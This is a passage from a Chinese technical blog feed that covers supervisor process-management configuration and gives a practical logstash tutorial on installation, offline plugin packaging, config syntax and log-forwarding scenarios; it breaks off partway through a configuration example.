class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">file=/tmp/supervisor.sock   ;UNIX socket 文件，supervisorctl 会使用</span><br><span class="line">;chmod=0700                 ;socket文件的mode，默认是0700</span><br><span class="line">;chown=nobody:nogroup       ;socket文件的owner，格式：uid:gid</span><br><span class="line"> </span><br><span class="line">;[inet_http_server]         ;HTTP服务器，提供web管理界面</span><br><span class="line">;port=127.0.0.1:9001        ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性</span><br><span class="line">;username=user              ;登录管理后台的用户名</span><br><span class="line">;password=123               ;登录管理后台的密码</span><br><span class="line"> </span><br><span class="line">[supervisord]</span><br><span class="line">logfile=/tmp/supervisord.log ;日志文件，默认是 <span class="variable">$CWD</span>/supervisord.log</span><br><span class="line">logfile_maxbytes=50MB        ;日志文件大小，超出会rotate，默认 50MB，如果设成0，表示不限制大小</span><br><span class="line">logfile_backups=10           ;日志文件保留备份数量默认10，设为0表示不备份</span><br><span class="line">loglevel=info                ;日志级别，默认info，其它: debug,warn,trace</span><br><span class="line">pidfile=/tmp/supervisord.pid ;pid 文件</span><br><span class="line">nodaemon=<span class="literal">false</span>               ;是否在前台启动，默认是<span class="literal">false</span>，即以 daemon 的方式启动</span><br><span class="line">minfds=1024                  ;可以打开的文件描述符的最小值，默认 1024。注意托管ES进程，这里要进行调整至65535</span><br><span class="line">minprocs=200                 ;可以打开的进程数的最小值，默认 200。注意托管ES进程，这里要进行调整至4096</span><br><span class="line"> </span><br><span class="line">[supervisorctl]</span><br><span class="line">serverurl=unix:///tmp/supervisor.sock ;通过UNIX socket连接supervisord，路径与unix_http_server部分的file一致</span><br><span class="line">;serverurl=http://127.0.0.1:9001 ; 通过HTTP的方式连接supervisord</span><br><span class="line"> </span><br><span class="line">; [program:xx]是被管理的进程配置参数，xx是进程的名称</span><br><span class="line">[program:xx]</span><br><span class="line"><span class="built_in">command</span>=/opt/apache-tomcat-8.0.35/bin/catalina.sh run  ; 程序启动命令</span><br><span class="line">autostart=<span class="literal">true</span>       ; 在supervisord启动的时候也自动启动</span><br><span class="line">startsecs=10         ; 启动10秒后没有异常退出，就表示进程正常启动了，默认为1秒</span><br><span class="line">autorestart=<span class="literal">true</span>     ; 程序退出后自动重启,可选值：[unexpected,<span class="literal">true</span>,<span class="literal">false</span>]，默认为unexpected，表示进程意外杀死后才重启</span><br><span class="line">startretries=3       ; 启动失败自动重试次数，默认是3</span><br><span class="line">user=tomcat          ; 用哪个用户启动进程，默认是root</span><br><span class="line">priority=999         ; 进程启动优先级，默认999，值小的优先启动</span><br><span class="line">redirect_stderr=<span class="literal">true</span> ; 把stderr重定向到stdout，默认<span class="literal">false</span></span><br><span class="line">stdout_logfile_maxbytes=20MB  ; stdout 日志文件大小，默认50MB</span><br><span class="line">stdout_logfile_backups = 20   ; stdout 日志文件备份数，默认是10</span><br><span class="line">; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）</span><br><span class="line">stdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.out</span><br><span class="line">stopasgroup=<span class="literal">false</span>     ;默认为<span class="literal">false</span>,进程被杀死时，是否向这个进程组发送stop信号，包括子进程</span><br><span class="line">killasgroup=<span class="literal">false</span>     ;默认为<span class="literal">false</span>，向进程组发送<span class="built_in">kill</span>信号，包括子进程</span><br><span class="line"> </span><br><span class="line">;包含其它配置文件</span><br><span class="line">[include]</span><br><span class="line">files = supervisord.d/*.ini    ;默认放在安装目录的supervisord.d目录下，可以指定一个或多个以.ini结束的配置文件。</span><br></pre></td></tr></table></figure><h2 id="子进程配置文件"><a href="#子进程配置文件" class="headerlink" title="子进程配置文件"></a>子进程配置文件</h2><p>需要给托管的子进程配置相应的配置文件，每个进程的配置文件都可以单独分拆也可以把相关的脚本放一起。目录及文件后缀可以在<br>supervisor.conf配置文件中进行自定义。见supervisor.conf的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[include]</span><br><span class="line">files = supervisord.d/*.ini  <span class="comment">#目录路径及文件后缀名都可以自定义。</span></span><br></pre></td></tr></table></figure><p>logstash.ini 样例说明：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#项目名</span></span><br><span class="line">[program:logstash-test]</span><br><span class="line"><span class="comment">#脚本目录</span></span><br><span class="line">directory=/app/elk/logstash-7.6.0</span><br><span class="line"><span class="comment">#脚本执行命令</span></span><br><span class="line"><span class="built_in">command</span>=/app/elk/logstash-7.6.0/bin/logstash -f /app/elk/logstash-7.6.0/bin/<span class="built_in">test</span>-pipeline.conf</span><br><span class="line"><span class="comment">#进程数</span></span><br><span class="line">numprocs=1</span><br><span class="line"><span class="comment">#supervisor启动的时候是否随着同时启动，默认True</span></span><br><span class="line">autostart=<span class="literal">true</span></span><br><span class="line"><span class="comment">#当程序exit的时候，这个program不会自动重启,默认unexpected，设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected和true。如果为false的时候，无论什么情况下，都不会被重新启动，如果为unexpected，只有当进程的退出码不在下面的exitcodes里面定义的</span></span><br><span class="line">autorestart=<span class="literal">false</span></span><br><span class="line"><span class="comment">#这个选项是子进程启动多少秒之后，此时状态如果是running，则我们认为启动成功了。默认值为1</span></span><br><span class="line">startsecs=1</span><br><span class="line"><span class="comment">#脚本运行的用户身份 </span></span><br><span class="line">user = root</span><br><span class="line"><span class="comment">#把stderr重定向到stdout，默认 false</span></span><br><span class="line">redirect_stderr = <span class="literal">true</span></span><br><span class="line"><span class="comment">#stdout日志文件大小，默认 50MB</span></span><br><span class="line">stdout_logfile_maxbytes = 10M</span><br><span class="line"><span class="comment">#stdout日志文件备份数</span></span><br><span class="line">stdout_logfile_backups = 10</span><br><span class="line"><span class="comment">#日志输出 </span></span><br><span class="line">stderr_logfile=/app/elk/logstash-7.6.0/logs/logstash_test_error.log</span><br><span class="line">stdout_logfile=/app/elk/logstash-7.6.0/logs/logstash_test_out.log</span><br></pre></td></tr></table></figure><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>logstash简明实用教程</title>
      <link href="/posts/a59d6c21/"/>
      <url>/posts/a59d6c21/</url>
      
        <content type="html"><![CDATA[<h1 id="一、logstash是什么"><a href="#一、logstash是什么" class="headerlink" title="一、logstash是什么"></a>一、logstash是什么</h1><p>Logstash 是开源的服务器端<strong>数据处理管道</strong>，能够同时从多个来源采集数据，转换数据，然后将数据发送到您最喜欢的“存储库”中。<br>官方介绍：Logstash is an open source data collection engine with real-time pipelining capabilities。简单来说logstash就是一根具备实时数据传输能力的管道，负责将数据信息从管道的输入端传输到管道的输出端；与此同时这根管道还可以让你根据自己的需求在中间加上滤网，Logstash提供里很多功能强大的滤网以满足你的各种应用场景。<br>Logstash 能够动态地采集、转换和传输数据，不受格式或复杂度的影响。利用 Grok 从非结构化数据中派生出结构，从 IP 地址解码出地理坐标，匿名化或排除敏感字段，并简化整体处理过程。</p><p>Logstash常用于日志关系系统中做日志采集设备；<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/1.png" alt="logstash"><br>系统结构<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/2.png" alt="logstash系统结构"><br>Logstash的事件（logstash将数据流中等每一条数据称之为一个event）处理流水线有三个主要角色完成：<strong>inputs –&gt; filters –&gt; outputs</strong>：</p><p><strong>输入（inpust）</strong>：必须，负责产生事件（Inputs generate events），常用：File、syslog、redis、beats（如：Filebeats）<br>Logstash 支持 各种输入选择 ，可以在同一时间从众多常用来源捕捉事件。能够以连续的流式传输方式，轻松地从日志、指标、Web 应用、数据存储以及各种 AWS 服务采集数据。</p><p><strong>过滤器（filters）</strong>：可选，负责数据处理与转换（filters modify them），常用：grok、mutate、drop、clone、geoip<br>过滤器能实时解析和转换数据<br>数据从源传输到存储库的过程中，Logstash 过滤器能够解析各个事件，识别已命名的字段以构建结构，并将它们转换成通用格式，以便更轻松、更快速地分析和实现商业价值。</p><ul><li>利用 Grok 从非结构化数据中派生出结构 </li><li>从 IP 地址破译出地理坐标 </li><li>将 PII 数据匿名化，完全排除敏感字段</li><li>简化整体处理，不受数据源、格式或架构的影响</li></ul><p><strong>输出（outpus）</strong>：必须，负责数据输出（outputs ship them elsewhere），常用：elasticsearch、file、graphite、statsd<br>Logstash 提供众多输出选择，可以将数据发送到指定的地方，并且能够灵活地解锁众多下游用例</p><p>其中inputs和outputs支持codecs（coder&amp;decoder）在1.3.0 版之前，logstash 只支持纯文本形式输入，然后以过滤器处理它。但现在，我们可以在输入 期处理不同类型的数据，所以完整的数据流程应该是：input | decode | filter | encode | output；codec 的引入，使得 logstash 可以更好更方便的与其他有自定义数据格式的运维产品共存，比如：graphite、fluent、netflow、collectd，以及使用 msgpack、</p><h1 id="二、为什么是logstash"><a href="#二、为什么是logstash" class="headerlink" title="二、为什么是logstash"></a>二、为什么是logstash</h1><p><strong>Logstash和Flume对比</strong><br>1、Logstash比较偏重于字段的预处理，在异常情况下可能会出现数据丢失，只是在运维日志场景下，一般认为这个可能不重要；而Flume偏重数据的传输，几乎没有数据的预处理，仅仅是数据的产生，封装成event然后传输；传输的时候flume比logstash多考虑了一些可靠性。因为数据会持久化在channel中，数据只有存储在下一个存储位置（可能是最终的存储位置，如HDFS；也可能是下一个Flume节点的channel），数据才会从当前的channel中删除。这个过程是通过事务来控制的，这样就保证了数据的可靠性。<br>2、Logstash有几十个插件，配置比较灵活，flume强调用户自定义开发；<br>3、Logstash的input和filter还有output之间都存在buffer，进行缓冲；Flume直接使用channel做持久化<br>4、Logstash性能以及资源消耗比较严重，且不支持缓存；<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/3.png" alt="Logstash和Flume对比"><br>详见参考：<a href="https://blog.csdn.net/songfeihu0810232/article/details/94406608" target="_blank" rel="noopener">https://blog.csdn.net/songfeihu0810232/article/details/94406608</a></p><h1 id="三、logstash安装与配置"><a href="#三、logstash安装与配置" class="headerlink" title="三、logstash安装与配置"></a>三、logstash安装与配置</h1><h2 id="1、logstash安装"><a href="#1、logstash安装" class="headerlink" title="1、logstash安装"></a>1、logstash安装</h2><p>环境要求：jdk1.8或以上<br>下载logstash软件包  logstash官方下载地址<a href="https://www.elastic.co/cn/downloads/logstash" target="_blank" rel="noopener">https://www.elastic.co/cn/downloads/logstash</a><br>下载后直接解压就可以用<br>如：tar zxvf logstash-7.6.0.tar.gz<br>解压后目录如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/4.png" alt="logstash目录"><br>目录结构说明见官方文档：<a href="https://www.elastic.co/guide/en/logstash/7.1/dir-layout.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/logstash/7.1/dir-layout.html</a><br>解压以后可以对logstash进行简单的测试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/logstash -e <span class="string">'input &#123; stdin &#123; &#125; &#125; output &#123; stdout &#123;&#125; &#125;'</span></span><br></pre></td></tr></table></figure><p>这条命令表示通过命令的方式指定logstash的输入输出分别是标准的输入输出，什么是标准的输入输出呢？就是控制台的输入输出。<br>等待启动成功，直接输入“hello world”<br>将会在控制台会有相应的输出<br>出现这些信息就表示logstash安装成功并且可以使用了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/5.png" alt="logstash测试"></p><h2 id="2、在线安装logstash插件"><a href="#2、在线安装logstash插件" class="headerlink" title="2、在线安装logstash插件"></a>2、在线安装logstash插件</h2><p>虽然logstash默认安装了大部分的插件，但是有些插件没有默认安装，如logstash-output-syslog、logstash-output-jdbc</p><h3 id="2-1-安装Gem并更新"><a href="#2-1-安装Gem并更新" class="headerlink" title="2.1. 安装Gem并更新"></a>2.1. 安装Gem并更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum install -y gem</span></span><br><span class="line"><span class="comment"># gem -v</span></span><br><span class="line">2.0.14.1</span><br><span class="line"><span class="comment"># gem update --system</span></span><br><span class="line"><span class="comment"># gem -v</span></span><br><span class="line">3.1.2</span><br></pre></td></tr></table></figure><h3 id="2-2-检查并修改镜像源"><a href="#2-2-检查并修改镜像源" class="headerlink" title="2.2 检查并修改镜像源"></a>2.2 检查并修改镜像源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gem sources -l</span></span><br><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"> </span><br><span class="line">https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/</span></span><br><span class="line">https://gems.ruby-china.com/ added to sources</span><br><span class="line">https://rubygems.org/ removed from sources</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat ~/.gemrc </span></span><br><span class="line">---</span><br><span class="line">:backtrace: <span class="literal">false</span></span><br><span class="line">:bulk_threshold: 1000</span><br><span class="line">:sources:</span><br><span class="line">- https://gems.ruby-china.com/</span><br><span class="line">:update_sources: <span class="literal">true</span></span><br><span class="line">:verbose: <span class="literal">true</span></span><br><span class="line">:concurrent_downloads: 8</span><br></pre></td></tr></table></figure><blockquote><p>请注意：国内的镜像站从<a href="https://gems.ruby-china.org" target="_blank" rel="noopener">https://gems.ruby-china.org</a> 换成了 <a href="https://gems.ruby-china.com" target="_blank" rel="noopener">https://gems.ruby-china.com</a><br>！！！现在很多网上的资料就都是写的<a href="https://gems.ruby-china.org，导致很多人换了镜像源也装不上。" target="_blank" rel="noopener">https://gems.ruby-china.org，导致很多人换了镜像源也装不上。</a></p></blockquote><h3 id="2-3-修改-logstash的-gem-镜像源"><a href="#2-3-修改-logstash的-gem-镜像源" class="headerlink" title="2.3. 修改 logstash的 gem 镜像源"></a>2.3. 修改 logstash的 gem 镜像源</h3><p>cd到logstach的安装目录，可以看到Gemfile文件 <code>vi Gemfile</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This is a Logstash generated Gemfile.</span></span><br><span class="line"><span class="comment"># If you modify this file manually all comments and formatting will be lost.</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">source</span> <span class="string">"https://rubygems.org"</span></span><br><span class="line">gem <span class="string">"logstash-core"</span>, :path =&gt; <span class="string">"./logstash-core"</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>更改默认的 <a href="https://rubygems.org" target="_blank" rel="noopener">https://rubygems.org</a> 为<a href="https://gems.ruby-china.com" target="_blank" rel="noopener">https://gems.ruby-china.com</a></p><h3 id="2-4、安装插件"><a href="#2-4、安装插件" class="headerlink" title="2.4、安装插件"></a>2.4、安装插件</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/6.png" alt="安装插件"></p><h2 id="3、离线安装logstash插件"><a href="#3、离线安装logstash插件" class="headerlink" title="3、离线安装logstash插件"></a>3、离线安装logstash插件</h2><p>在实际应用过程中有些生产环境是封闭的网络环境，没法连接外网。这时候就需要离线安装插件。<br>说离线安装实际就是在一个有网络的环境下将插件装好，然后再装到离线环境中。<br>这里有两种方式,<br>一种就是在有网络的环境下将插件装好，将整个logsash包离线拷到生产环境。<br>另一种方式就是在有网络的环境下将插件装好后，将logstash的需要离线安装的插件打个离线包，然后再在生产环境进行离线安装。<br>离线插件包打包安装具体操作如下：</p><h3 id="3-1-通过logstash-plugin-prepare-offline-pack-命令将插件打成zip包"><a href="#3-1-通过logstash-plugin-prepare-offline-pack-命令将插件打成zip包" class="headerlink" title="3.1 通过logstash-plugin prepare-offline-pack 命令将插件打成zip包"></a>3.1 通过logstash-plugin prepare-offline-pack 命令将插件打成zip包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./logstash-plugin prepare-offline-pack --output logstash-output-syslog.zip logstash-output-syslog</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/7.png" alt="打包"><br>打包命令执行成功以后，可以看到在logstash的bin目录下有打成的离线插件zip包<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/8.png" alt="打包后生成的离线包"></p><h3 id="3-2-通过logstash-plugin-install-进行离线安装"><a href="#3-2-通过logstash-plugin-install-进行离线安装" class="headerlink" title="3.2 通过logstash-plugin install 进行离线安装"></a>3.2 通过logstash-plugin install 进行离线安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/logstash-plugin install file:///home/logstash/logstash-7.6.2/tools/logstash-output-syslog.zip</span><br></pre></td></tr></table></figure><p>安装后成功会有如下提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Installing file: /home/logstash/logstash-7.6.2/tools/logstash-output-syslog.zip</span><br><span class="line">Install successful</span><br></pre></td></tr></table></figure><h3 id="3-2-通过logstash-plugin-list命令检查插件是否安装成功"><a href="#3-2-通过logstash-plugin-list命令检查插件是否安装成功" class="headerlink" title="3.2 通过logstash-plugin list命令检查插件是否安装成功"></a>3.2 通过logstash-plugin list命令检查插件是否安装成功</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/9.png" alt="logstash-plugin list"></p><h2 id="4、logstash简单配置说明"><a href="#4、logstash简单配置说明" class="headerlink" title="4、logstash简单配置说明"></a>4、logstash简单配置说明</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>Logstash 设计了自己的 DSL ——包括有区域，注释，数据类型(布尔值，字符串，数值，数组，哈希)，条件判断，字段引用等。</p><h3 id="区段-section"><a href="#区段-section" class="headerlink" title="区段(section)"></a>区段(section)</h3><p>Logstash 用 {} 来定义区域。区域内可以包括插件区域定义，你可以在一个区域内定义多个插件。插件区域内则可以定义键值对设置。示例如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    stdin &#123;&#125;</span><br><span class="line">    syslog &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>Logstash 支持少量的数据值类型：</p><ul><li>bool<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug =&gt; <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li>string<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host =&gt; <span class="string">"hostname"</span></span><br></pre></td></tr></table></figure></li><li>number<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port =&gt; <span class="number">514</span></span><br></pre></td></tr></table></figure></li><li>array<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">match =&gt; [<span class="string">"datetime"</span>, <span class="string">"UNIX"</span>, <span class="string">"ISO8601"</span>]</span><br></pre></td></tr></table></figure></li><li>hash<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">options =&gt; &#123;</span><br><span class="line">    key1 =&gt; <span class="string">"value1"</span>,</span><br><span class="line">    key2 =&gt; <span class="string">"value2"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字段引用-field-reference"><a href="#字段引用-field-reference" class="headerlink" title="字段引用(field reference)"></a>字段引用(field reference)</h3>如果想在 Logstash 配置中使用字段的值，只需要把字段的名字写在中括号 [] 里就行了，这就叫字段引用。<br>对于 嵌套字段(也就是多维哈希表，或者叫哈希的哈希)，每层的字段名都写在 [] 里就可以了。比如，你可以从 geoip 里这样获取 longitude 值：<br>[geoip][location][0]<br>logstash 的数组也支持倒序下标，即 [geoip][location][-1] 可以获取数组最后一个元素的值。<br>Logstash 还支持变量内插，在字符串里使用字段引用的方法是这样：<br>“the longitude is %{[geoip][location][0]}”</li></ul><h3 id="条件判断-condition"><a href="#条件判断-condition" class="headerlink" title="条件判断(condition)"></a>条件判断(condition)</h3><p>表达式支持下面这些操作符：<br>equality, etc: ==, !=, &lt;, &gt;, &lt;=, &gt;=<br>regexp: =<del>, !</del><br>inclusion: in, not in<br>boolean: and, or, nand, xor<br>unary: !()<br>通常来说，你都会在表达式里用到字段引用。比如：<br>if “_grokparsefailure” not in [tags] {<br>} else if [status] !~ /^2\d\d/ and [url] == “/noc.gif” {<br>} else {<br>}</p><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><p>Logstash 提供了一个 shell 脚本叫 logstash 方便快速运行。它支持一下参数：<br>-e<br>意即执行。我们在 “Hello World” 的时候已经用过这个参数了。事实上可以不写任何具体配置，直接运行 <code>bin/logstash -e</code> ‘’ 达到相同效果。这个参数的默认值是下面这样：<br>input {<br>    stdin { }<br>}<br>output {<br>    stdout { }<br>}<br>–config 或 -f<br>意即文件。真实运用中，我们会写很长的配置，甚至可能超过 shell 所能支持的 1024 个字符长度。所以我们必把配置固化到文件里，然后通过 <code>bin/logstash -f agent.conf</code> 这样的形式来运行。<br>此外，logstash 还提供一个方便我们规划和书写配置的小功能。你可以直接用 <code>bin/logstash -f /etc/logstash.d/</code> 来运行。logstash 会自动读取 /etc/logstash.d/ 目录下所有的文本文件，然后在自己内存里拼接成一个完整的大配置文件，再去执行。<br>–configtest 或 -t<br>意即测试。用来测试 Logstash 读取到的配置文件语法是否能正常解析。Logstash 配置语法是用 grammar.treetop 定义的。尤其是使用了上一条提到的读取目录方式的读者，尤其要提前测试。<br>–log 或 -l<br>意即日志。Logstash 默认输出日志到标准错误。生产环境下你可以通过 bin/logstash -l logs/logstash.log 命令来统一存储日志。<br>–filterworkers 或 -w<br>意即工作线程。Logstash 会运行多个线程。你可以用 <code>bin/logstash -w 5</code> 这样的方式强制 Logstash 为过滤插件运行 5 个线程。</p><h1 id="四、logstash使用的几种典型的应用场景"><a href="#四、logstash使用的几种典型的应用场景" class="headerlink" title="四、logstash使用的几种典型的应用场景"></a>四、logstash使用的几种典型的应用场景</h1><h2 id="1、通过logstash将syslog日志原始日志转发"><a href="#1、通过logstash将syslog日志原始日志转发" class="headerlink" title="1、通过logstash将syslog日志原始日志转发"></a>1、通过logstash将syslog日志原始日志转发</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/10.png" alt="syslog日志原始日志转发"><br>在logstash的bin目录下新建配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="built_in">test</span>-pipeline.conf</span><br></pre></td></tr></table></figure><p>编辑input和output</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    stdin&#123;</span><br><span class="line">      type =&gt; <span class="string">"test-log"</span></span><br><span class="line">    &#125;</span><br><span class="line">    syslog&#123;</span><br><span class="line">        type =&gt; <span class="string">"test-log"</span></span><br><span class="line">        port =&gt; <span class="number">514</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">output</span><br><span class="line">&#123;</span><br><span class="line">    stdout &#123;</span><br><span class="line">      codec =&gt; rubydebug</span><br><span class="line">    &#125;</span><br><span class="line">    syslog&#123;</span><br><span class="line">        host =&gt; <span class="string">"192.168.2.185"</span></span><br><span class="line">        port =&gt; <span class="number">514</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就相当于把日志转发到了192.168.2.185这台机器的514端口<br>编辑好配置文件以后执行<br><code>./logstash -f test-pipeline.conf --config.test_and_exit</code>     对配置文件进行检查，如果配置文件写得有问题，将会有错误提示。<br>配置文件检查没有问题后就可以启动logstash执行了<code>./logstash -f test-pipeline.conf  --config.reload.automatic</code><br>用udpsender工具往这台机器上发送日志信息，可以看到日志转发到192.168.2.185这台机器上了。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/11.png" alt="updsend发送日志"></p><p>在控制台可以看到192.168.2.185，接收到了192.168.2.173转发过来的日志<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/12.png" alt="控制台日志"></p><h2 id="2、通过rsyslog、logstash采集nginx等中间件的日志送到ES"><a href="#2、通过rsyslog、logstash采集nginx等中间件的日志送到ES" class="headerlink" title="2、通过rsyslog、logstash采集nginx等中间件的日志送到ES"></a>2、通过rsyslog、logstash采集nginx等中间件的日志送到ES</h2><p>logstash可以与rsyslog、filebeat等无缝结合采集nginx等中间件日志，送给数据存储。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/13.png" alt="通过rsyslog、logstash采集nginx等中间件的日志送到ES"></p><p>具体参见：<a href="https://xiejava.gitee.io/posts/f3e97829/">https://xiejava.gitee.io/posts/f3e97829/</a></p><h2 id="3、通过logstash将日志入kafka再入mysql或ES"><a href="#3、通过logstash将日志入kafka再入mysql或ES" class="headerlink" title="3、通过logstash将日志入kafka再入mysql或ES"></a>3、通过logstash将日志入kafka再入mysql或ES</h2><p>数据先放到kafka队列里缓存削峰，然后从kafka队列里读取数据到mysql或其他存储系统中进行保存。<img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/14.png" alt="logstash将日志入kafka再入mysql或ES"><br>具体参见：<a href="https://xiejava.gitee.io/posts/54e4fd14/">https://xiejava.gitee.io/posts/54e4fd14/</a></p><h2 id="4、通过logstash进行日志补全后再转发或入库"><a href="#4、通过logstash进行日志补全后再转发或入库" class="headerlink" title="4、通过logstash进行日志补全后再转发或入库"></a>4、通过logstash进行日志补全后再转发或入库</h2><p>采集原始日志以后，需要对原始日志进行调整合补齐，比如最常见的是根据IP来补齐IP的经纬度等信息。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/15.png" alt="logstash进行日志补全"></p><p>这里就可以用logstash的geotip，也可以用其他的外部API接口，为了更具代表性的说明，这里调用的是第三方的http接口（<a href="http://ip-api.com/json/），这个接口也是可以自己定义的。" target="_blank" rel="noopener">http://ip-api.com/json/），这个接口也是可以自己定义的。</a><br>参考配置文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 